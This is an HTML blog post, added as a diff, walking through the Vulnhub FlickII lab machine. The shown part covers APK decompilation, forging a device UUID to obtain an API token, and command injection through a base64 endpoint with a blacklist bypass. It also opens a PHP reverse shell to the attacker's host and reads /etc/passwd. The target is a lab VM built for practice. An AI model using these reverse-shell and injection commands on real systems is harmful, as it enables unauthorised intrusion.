@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>Vulnhub - FlickII | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2016/03/vulnhub-flickii.html" title="Read more" class="entry-title-link">
+                Vulnhub - FlickII</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2016-03-13T20:43:00+01:00">13 Mar 2016</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/vulnhub.html" title="Read more with the label vulnhub" class="meta-link">vulnhub</a> 
+          <a href="../../tag/challenge.html" title="Read more with the label challenge" class="meta-link">challenge</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 19 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left"
+src="/media/2016.03/flickii.png" alt="FlickII" width="162"></p>
+<p>Still playing with the vulnhub machines this time it is the turn of FlickII.
+This one is different from the others as it has an android application
+associated. It would be a great exercice to play with mobile application,
+decompile it and see what is in the inside.</p>
+
+
+<div class="toc">
+<ul>
+<li><a href="#host-discovery">Host discovery</a></li>
+<li><a href="#apk-analysis">APK analysis</a><ul>
+<li><a href="#api-token-and-doregisteractivityjava">API token and DoRegisterActivity.java</a></li>
+<li><a href="#command-execution-and-commandactivityjava">Command execution and CommandActivity.java</a></li>
+</ul>
+</li>
+<li><a href="#shell-exploitation">Shell exploitation</a><ul>
+<li><a href="#reverse-shell">Reverse shell</a></li>
+<li><a href="#batman-and-robin">Batman and Robin?</a></li>
+<li><a href="#where-is-bryan">Where is bryan?</a></li>
+<li><a href="#sean">sean</a></li>
+<li><a href="#root-me">root me?</a></li>
+</ul>
+</li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+</div>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Connecting to host-only network:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sudo ip addr add 192.168.56.1/24 dev vboxnet</span>
+<span class="code-line"></code></pre></div>
+
+<p>Scanning the network to find the virtual machine IP address:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">maggick@rootine flick-check-dist</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sn</span><span class="w"> </span><span class="mf">192.168.56.1</span><span class="o">/</span><span class="mi">24</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.01</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2015</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">30</span><span class="w"> </span><span class="mi">18</span><span class="err">:</span><span class="mi">41</span><span class="w"> </span><span class="n">CET</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">192.168.56.1</span><span class="w"></span></span>
+<span class="code-line"><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.00061</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">192.168.56.101</span><span class="w"></span></span>
+<span class="code-line"><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.00097</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">256</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">addresses</span><span class="w"> </span><span class="p">(</span><span class="mi">2</span><span class="w"> </span><span class="n">hosts</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">2.45</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Scanning the virtual machine to find open ports:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">maggick@rootine flick-check-dist</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p0</span><span class="o">-</span><span class="mi">65535</span><span class="w"> </span><span class="mf">192.168.56.101</span><span class="w"> </span><span class="o">-</span><span class="n">T4</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.01</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2015</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">30</span><span class="w"> </span><span class="mi">18</span><span class="err">:</span><span class="mi">50</span><span class="w"> </span><span class="n">CET</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">192.168.56.101</span><span class="w"></span></span>
+<span class="code-line"><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.00088</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span></span>
+<span class="code-line"><span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65534</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">ports</span><span class="w"></span></span>
+<span class="code-line"><span class="n">PORT</span><span class="w">    </span><span class="k">STATE</span><span class="w">  </span><span class="n">SERVICE</span><span class="w"></span></span>
+<span class="code-line"><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="n">closed</span><span class="w"> </span><span class="n">http</span><span class="w"></span></span>
+<span class="code-line"><span class="mi">443</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">   </span><span class="n">https</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">123.28</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="apk-analysis">APK analysis</h2>
+<p>We got an apk. If we unzip it we got lots of xml files and a dex file.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">ls</span><span class="w"> </span><span class="o">~/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">flickII</span><span class="o">/</span><span class="n">flick</span><span class="o">-</span><span class="n">check</span><span class="o">-</span><span class="n">dist</span><span class="w"></span></span>
+<span class="code-line"><span class="n">AndroidManifest</span><span class="o">.</span><span class="n">xml</span><span class="w">  </span><span class="n">classes</span><span class="o">.</span><span class="n">dex</span><span class="w">  </span><span class="n">META</span><span class="o">-</span><span class="bp">INF</span><span class="w">  </span><span class="n">README</span><span class="w">  </span><span class="n">res</span><span class="w">  </span><span class="n">resources</span><span class="o">.</span><span class="n">arsc</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>There is a lot of tool in order to decompile and APK and get class files or jar
+files like <a href="http://siis.cse.psu.edu/dare/">dare</a>,
+<a href="http://sourceforge.net/projects/dex2jar/">dex2jar</a> and more (<a href="http://shgck.io/docs/android/apk_decomp/">here is an article
+about android decompiler comparison</a>).</p>
+<p>I tried to use dare to convert dex file to Java bytecode but there was an issue
+between my 64 bits Arch Linux system and the 32 bits executable. I didn't dig
+this issue and just go for dex2jar:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sh d2j-dex2jar.sh flick-check-dist.apk</span>
+<span class="code-line"></code></pre></div>
+
+<p>From there I use <a href="http://www.benf.org/other/cfr/">cfr</a> to decompile the jar file
+to Java files and human readable code.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>java -jar cfr_0_110.jar flickII/flick-check-dist-dex2jar.jar --outputdir flickII/flick-check-dist-cfr-java/</span>
+<span class="code-line"></code></pre></div>
+
+<p>We got the decompiled code. The interesting part of the application is the
+com/flick/flickeck folder:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>├── com</span>
+<span class="code-line">│   ├── flick</span>
+<span class="code-line">│   │   └── flickcheck</span>
+<span class="code-line">│   │       ├── BuildConfig.java</span>
+<span class="code-line">│   │       ├── CallApi.java</span>
+<span class="code-line">│   │       ├── CommandActivity.java</span>
+<span class="code-line">│   │       ├── DoRegisterActivity.java</span>
+<span class="code-line">│   │       ├── MainActivity.java</span>
+<span class="code-line">│   │       ├── PubKeyManager.java</span>
+<span class="code-line">│   │       ├── ReadApiServerActivity.java</span>
+<span class="code-line">│   │       ├── RegisterActivity.java</span>
+<span class="code-line">│   │       └── R.java</span>
+<span class="code-line"></code></pre></div>
+
+<p>We take a look at each file in this directory in order to understand the
+application goal and how it works.</p>
+<h3 id="api-token-and-doregisteractivityjava">API token and DoRegisterActivity.java</h3>
+<p>The file DoRegisterActivity.java show us how to register a new device. By
+testing the URL presented in the file we got:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@rootine ~]$ curl   https://192.168.56.101/register/new --insecure</span>
+<span class="code-line">{&quot;error&quot;:&quot;This method is not allowed for the requested resource.&quot;}</span>
+<span class="code-line"></code></pre></div>
+
+<p>We lack an ID to "authenticate" ourself. The line 70 to 75 show us how to get
+this ID:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">Object</span> <span class="n">object2</span> <span class="o">=</span> <span class="p">(</span><span class="n">TelephonyManager</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">getBaseContext</span><span class="p">().</span><span class="na">getSystemService</span><span class="p">(</span><span class="s">&quot;phone&quot;</span><span class="p">);</span></span>
+<span class="code-line"><span class="n">object</span> <span class="o">=</span> <span class="s">&quot;&quot;</span> <span class="o">+</span> <span class="n">object2</span><span class="p">.</span><span class="na">getDeviceId</span><span class="p">();</span></span>
+<span class="code-line"><span class="n">object2</span> <span class="o">=</span> <span class="s">&quot;&quot;</span> <span class="o">+</span> <span class="n">object2</span><span class="p">.</span><span class="na">getSimSerialNumber</span><span class="p">();</span></span>
+<span class="code-line"><span class="n">object</span> <span class="o">=</span> <span class="k">new</span> <span class="n">UUID</span><span class="p">((</span><span class="s">&quot;&quot;</span> <span class="o">+</span> <span class="n">Settings</span><span class="p">.</span><span class="na">Secure</span><span class="p">.</span><span class="na">getString</span><span class="p">((</span><span class="n">ContentResolver</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">getContentResolver</span><span class="p">(),</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="s">&quot;android_id&quot;</span><span class="p">)).</span><span class="na">hashCode</span><span class="p">(),</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">object</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span> <span class="o">|</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">object2</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()).</span><span class="na">toString</span><span class="p">();</span></span>
+<span class="code-line"><span class="n">object2</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="na">getSharedPreferences</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">2131099666</span><span class="p">),</span> <span class="mi">0</span><span class="p">).</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;api_server&quot;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span></span>
+<span class="code-line"><span class="k">new</span> <span class="n">CallAPI</span><span class="p">().</span><span class="na">execute</span><span class="p">((</span><span class="n">Object</span><span class="o">[]</span><span class="p">)</span><span class="k">new</span> <span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;https://&quot;</span> <span class="o">+</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">object2</span> <span class="o">+</span> <span class="s">&quot;/register/new&quot;</span><span class="p">,</span> <span class="n">object</span><span class="p">});</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Let us wrote some Java to generate this ID for us:</p>
+<p>Our <code>object</code> and <code>object2</code> variables are named generically by the debugger. We
+can see in the code above that <code>object</code> is a string containing the device ID and
+that <code>object2</code> is a string containing the serial number of the Sim card.
+Moreover the line where the code generate the new UUID (see the
+<a href="http://docs.oracle.com/javase/1.5.0/docs/api/java/util/UUID.html">javadoc</a> for
+more information about this object) use an other variable accessible on the
+phone: the android ID.</p>
+<p>With all this information we come easily with the following code:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">java.util.UUID</span><span class="p">;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloWorld</span> <span class="p">{</span></span>
+<span class="code-line"></span>
+<span class="code-line">  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span></span>
+<span class="code-line">    <span class="n">String</span> <span class="n">deviceId</span> <span class="o">=</span> <span class="s">&quot;12345&quot;</span><span class="p">;</span></span>
+<span class="code-line">    <span class="n">String</span> <span class="n">SimSerialNumber</span> <span class="o">=</span> <span class="s">&quot;67890&quot;</span><span class="p">;</span></span>
+<span class="code-line">    <span class="n">String</span> <span class="n">androidId</span><span class="o">=</span> <span class="s">&quot;34567&quot;</span><span class="p">;</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">String</span> <span class="n">code</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">;</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">code</span> <span class="o">=</span> <span class="k">new</span> <span class="n">UUID</span><span class="p">(</span><span class="n">androidId</span><span class="p">.</span><span class="na">hashCode</span><span class="p">(),</span> <span class="n">deviceId</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span> <span class="o">|</span> <span class="n">SimSerialNumber</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()).</span><span class="na">toString</span><span class="p">();</span></span>
+<span class="code-line">    <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">code</span><span class="p">);</span></span>
+<span class="code-line">    <span class="p">}</span></span>
+<span class="code-line"><span class="p">}</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We compile this code with <code>javac</code> and execute it with <code>java</code> (yeah I have named
+it HelloWorld):</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@rootine ~]$ java HelloWorld</span>
+<span class="code-line">00000000-02e7-1fb5-0000-000003daceff</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can now try again the URL with this UUID sent in a post parameter:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@rootine ~]$ curl --data &#39;uuid=00000000-02e7-1fb5-0000-000003daceff&#39; https://192.168.56.101/register/new --insecure</span>
+<span class="code-line">{&quot;registered&quot;:&quot;ok&quot;,&quot;message&quot;:&quot;The requested UUID is now registered.&quot;,&quot;token&quot;:&quot;t6nsb2SrfYKqsp8JIdbEscwfwA6JEeUh&quot;}</span>
+<span class="code-line"></code></pre></div>
+
+<p>Great we are registered, what's next?</p>
+<h3 id="command-execution-and-commandactivityjava">Command execution and CommandActivity.java</h3>
+<p>Line 111 in the file <code>CommandActivity.java</code> we see the doCmd method that seems
+to execute commands on the server via HTTP:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">doCmd</span><span class="p">(</span><span class="n">View</span> <span class="n">object</span><span class="p">)</span> <span class="p">{</span></span>
+<span class="code-line">    <span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">((</span><span class="n">Context</span><span class="p">)</span><span class="k">this</span><span class="p">,</span> <span class="p">(</span><span class="n">CharSequence</span><span class="p">)(</span><span class="s">&quot;Running command: &quot;</span> <span class="o">+</span> <span class="n">object</span><span class="p">.</span><span class="na">getTag</span><span class="p">().</span><span class="na">toString</span><span class="p">()),</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="mi">0</span><span class="p">).</span><span class="na">show</span><span class="p">();</span></span>
+<span class="code-line">    <span class="n">object</span> <span class="o">=</span> <span class="n">Base64</span><span class="p">.</span><span class="na">encodeToString</span><span class="p">((</span><span class="kt">byte</span><span class="o">[]</span><span class="p">)</span><span class="n">object</span><span class="p">.</span><span class="na">getTag</span><span class="p">().</span><span class="na">toString</span><span class="p">().</span><span class="na">getBytes</span><span class="p">(),</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">Object</span> <span class="n">object2</span> <span class="o">=</span> <span class="p">(</span><span class="n">TelephonyManager</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">getBaseContext</span><span class="p">().</span><span class="na">getSystemService</span><span class="p">(</span><span class="s">&quot;phone&quot;</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">String</span> <span class="n">string2</span> <span class="o">=</span> <span class="s">&quot;&quot;</span> <span class="o">+</span> <span class="n">object2</span><span class="p">.</span><span class="na">getDeviceId</span><span class="p">();</span></span>
+<span class="code-line">    <span class="n">object2</span> <span class="o">=</span> <span class="s">&quot;&quot;</span> <span class="o">+</span> <span class="n">object2</span><span class="p">.</span><span class="na">getSimSerialNumber</span><span class="p">();</span></span>
+<span class="code-line">    <span class="n">string2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">UUID</span><span class="p">((</span><span class="s">&quot;&quot;</span> <span class="o">+</span> <span class="n">Settings</span><span class="p">.</span><span class="na">Secure</span><span class="p">.</span><span class="na">getString</span><span class="p">((</span><span class="n">ContentResolver</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">getContentResolver</span><span class="p">(),</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="s">&quot;android_id&quot;</span><span class="p">)).</span><span class="na">hashCode</span><span class="p">(),</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">string2</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span> <span class="o">|</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">object2</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()).</span><span class="na">toString</span><span class="p">();</span></span>
+<span class="code-line">    <span class="n">Object</span> <span class="n">object3</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="na">getSharedPreferences</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">2131099666</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">object2</span> <span class="o">=</span> <span class="n">object3</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;api_server&quot;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">object3</span> <span class="o">=</span> <span class="n">object3</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;api_auth_token&quot;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span></span>
+<span class="code-line">    <span class="k">new</span> <span class="n">CallAPI</span><span class="p">().</span><span class="na">execute</span><span class="p">((</span><span class="n">Object</span><span class="o">[]</span><span class="p">)</span><span class="k">new</span> <span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;https://&quot;</span> <span class="o">+</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">object2</span> <span class="o">+</span> <span class="s">&quot;/do/cmd/&quot;</span> <span class="o">+</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">object</span><span class="p">,</span> <span class="n">string2</span><span class="p">,</span> <span class="n">object3</span><span class="p">});</span></span>
+<span class="code-line"><span class="p">}</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>The View object in parameter is the command to execute. The command is just
+base64 encoded before sending it to the server as <code>object</code> in the url, the
+string2<code>parameter is the UUID we generate a few lines ago sent in the HTTP
+header as 'X-UUID'
+parameter, the</code>object3` parameter is the token to authenticate to the API given
+with the curl command just before also sent in the header as 'X-Token' (you may
+need to look at the CallAPI method and more particulary at line 182 and 183)</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@rootine ~]$ curl   https://192.168.56.101/do/cmd/$(echo -ne id | base64) --header &quot;X-UUID: 00000000-02e7-1fb5-0000-000003daceff&quot; --header &quot;X-Token: n1dJEyZaiFtRyJSoIl2pzI0HDO6BGw18&quot; --insecure</span>
+<span class="code-line">{&quot;status&quot;:&quot;ok&quot;,&quot;command&quot;:&quot;id&quot;,&quot;output&quot;:&quot;uid=998(nginx) gid=997(nginx) groups=997(nginx)\n&quot;}</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can execute command on the server, let us wrote a simple bash script to
+simplify the next steps (we put an echo at the end to have a nice output):</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="ch">#!/bin/bash</span></span>
+<span class="code-line"></span>
+<span class="code-line">curl   https://192.168.56.101/do/cmd/<span class="k">$(</span><span class="nb">echo</span> -ne <span class="nv">$1</span> <span class="p">|</span> base64<span class="k">)</span> --header <span class="s2">&quot;X-UUID: 00000000-02e7-1fb5-0000-000003daceff&quot;</span> --header <span class="s2">&quot;X-Token: n1dJEyZaiFtRyJSoIl2pzI0HDO6BGw18&quot;</span> --insecure</span>
+<span class="code-line"><span class="nb">echo</span> <span class="s1">&#39;&#39;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Let us gather some information about the system (there is a blacklist that block
+us and forgive us to directly use <code>ls</code> but the absolute path works):</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@rootine ~]$ ./p ls</span>
+<span class="code-line">{&quot;status&quot;:&quot;error&quot;,&quot;output&quot;:&quot;Command &#39;ls&#39; contains a banned command.&quot;}</span>
+<span class="code-line">[maggick@rootine ~]$ ./p /bin/ls</span>
+<span class="code-line">{&quot;status&quot;:&quot;ok&quot;,&quot;command&quot;:&quot;\/bin\/ls&quot;,&quot;output&quot;:&quot;index.php\ntest.php\n&quot;}</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="shell-exploitation">Shell exploitation</h2>
+<h3 id="reverse-shell">Reverse shell</h3>
+<p>From there we can get an interactive reverse shell. Let us use the php reverse
+shell from
+<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>:</p>
+<p>We need to listen on our host machine for the server connection:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>nc -v -n -l -p 8080</span>
+<span class="code-line"></code></pre></div>
+
+<p>Then we need to open the connection from the server:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>/bin\/php -r &#39;$sock=fsockopen(\&quot;192.168.56.1\&quot;,8080);exec(\&quot;\/bin\/sh -i &lt;&amp;4 &gt;&amp;4 2&gt;&amp;4\&quot;);&#39;</span>
+<span class="code-line"></code></pre></div>
+
+<p>It works with no more restriction:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sh-4.2$ id</span>
+<span class="code-line">id</span>
+<span class="code-line">uid=998(nginx) gid=997(nginx) groups=997(nginx)</span>
+<span class="code-line"></code></pre></div>
+
+<h3 id="batman-and-robin">Batman and Robin?</h3>
+<p>We can get a look at the <code>/etc/passwd</code> file:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat /etc/passwd</span>
+<span class="code-line">root:x:0:0:root:/root:/bin/bash</span>
+<span class="code-line">bin:x:1:1:bin:/bin:/sbin/nologin</span>
+<span class="code-line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span>
+<span class="code-line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span>
+<span class="code-line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span>
+<span class="code-line">sync:x:5:0:sync:/sbin:/bin/sync</span>
+<span class="code-line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span>
+<span class="code-line">halt:x:7:0:halt:/sbin:/sbin/halt</span>
+<span class="code-line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span>
+<span class="code-line">operator:x:11:0:operator:/root:/sbin/nologin</span>
+<span class="code-line">games:x:12:100:games:/usr/games:/sbin/nologin</span>
+<span class="code-line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span>
+<span class="code-line">nobody:x:99:99:Nobody:/:/sbin/nologin</span>
+<span class="code-line">avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin</span>
+<span class="code-line">dbus:x:81:81:System message bus:/:/sbin/nologin</span>
+<span class="code-line">polkitd:x:999:998:User for polkitd:/:/sbin/nologin</span>
+<span class="code-line">tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin</span>
+<span class="code-line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span>
+<span class="code-line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span>
+<span class="code-line">nginx:x:998:997:Nginx web server:/var/lib/nginx:/sbin/nologin</span>
+<span class="code-line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span>
+<span class="code-line">robin:x:1000:1000::/home/robin:/bin/bash</span>
+<span class="code-line">bryan:x:1001:1001::/home/bryan:/bin/bash</span>
+<span class="code-line">sean:x:1002:1002::/home/sean:/bin/bash</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can see in the <code>/etc/passwd</code> file that there is 3 users: robin, bryan and
+sean. Moreover in the <code>CommandActivity.java</code> file we have seen that there is a
+mean to execute ssh command (also the port is not open) using the user robin.
+The password used for this command is a simply a XOR between the
+<code>integryity_check</code> base64 encoded string at the beginning of the file and the
+string define in the validate method. We can reuse the code from there and find
+back the password: 40373df4b7a1f413af61cf7fd06d03a565a51898</p>
+<p>With our reverse shell a simple <code>su robin</code> and the password above give us a shell
+as the robin user:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>id</span>
+<span class="code-line">uid=1000(robin) gid=1000(robin) groups=1000(robin)</span>
+<span class="code-line"></code></pre></div>
+
